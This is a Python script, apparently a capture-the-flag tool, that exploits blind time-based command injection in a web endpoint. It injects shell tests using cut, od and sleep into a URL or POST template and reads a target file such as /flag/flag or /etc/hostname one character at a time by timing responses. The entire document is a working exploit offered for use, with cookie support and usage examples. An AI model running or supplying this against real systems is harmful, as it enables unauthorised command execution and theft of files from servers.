#!/usr/bin/env python3
"""Read a file through a *blind* (time-based) command injection.

The injection template contains {cmd}; the script injects a shell test that
sleeps when character N of the file has an ASCII code greater than M
(binary search, ~7 requests/char).

    python blind_cmd_time.py http://t/ping --data "host=127.0.0.1;{cmd}" --file /flag/flag
    python blind_cmd_time.py "http://t/check?h=x%0a{cmd}" --file /etc/hostname --delay 2
"""
import argparse
import time
from urllib.parse import quote

import requests


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data", help="POST body with {cmd}")
    ap.add_argument("--file", default="/flag/flag")
    ap.add_argument("--delay", type=float, default=1.5)
    ap.add_argument("--max", type=int, default=120)
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def slow(cmd):
        q = quote(cmd, safe="")
        t0 = time.perf_counter()
        if a.data:
            requests.post(a.url, data=a.data.replace("{cmd}", q), timeout=a.delay + 20,
                          headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            requests.get(a.url.replace("{cmd}", q), headers=hdr, timeout=a.delay + 20)
        return time.perf_counter() - t0 > a.delay * 0.8

    if not slow(f"sleep {a.delay}"):
        print("[!] sleep did not delay the response — not injectable with this template?")
    out = ""
    for pos in range(1, a.max + 1):
        c = f"$(cut -c{pos} {a.file} | od -An -tu1 | head -1)"
        if not slow(f'[ -n "$(cut -c{pos} {a.file})" ] && sleep {a.delay}'):
            break
        lo, hi = 31, 127
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if slow(f"[ {c} -gt {mid} ] && sleep {a.delay}"):
                lo = mid
            else:
                hi = mid
        out += chr(hi)
        print(out, flush=True)
    print(out)


if __name__ == "__main__":
    main()
